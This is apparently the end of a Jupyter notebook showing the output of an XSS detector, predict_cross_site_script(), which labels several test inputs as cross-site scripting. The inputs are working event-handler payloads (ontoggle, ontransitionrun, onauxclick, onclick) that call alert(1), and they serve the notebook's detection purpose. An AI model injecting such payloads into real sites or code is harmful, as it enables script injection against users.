      " It can be Cross site scripting attack\n",
      "====================\n",
      "Give me some data to work on : <details ontoggle=alert(1) open>test</details>\n",
      "====================\n",
      " It can be Cross site scripting attack\n",
      "====================\n",
      "Give me some data to work on : <style>:target {transform: rotate(180deg);}</style><a id=x style=\"transition:transform \t\t\t\t\t\t\t\t\t2s\" ontransitionrun=alert(1)></a>\n",
      "====================\n",
      " It can be Cross site scripting attack\n",
      "====================\n",
      "Give me some data to work on : <input onauxclick=alert(1)>\n",
      "====================\n",
      " It can be Cross site scripting attack\n",
      "====================\n",
      "Give me some data to work on : <a onclick=\"alert(1)\">test</a>\n",
      "====================\n",
      " It can be Cross site scripting attack\n",
      "====================\n",
      "Give me some data to work on : 0\n",
      "====================\n",
      " Good Bye \n"
     ]
    }
   ],
   "source": [
    "predict_cross_site_script()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.7.6"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 4
}
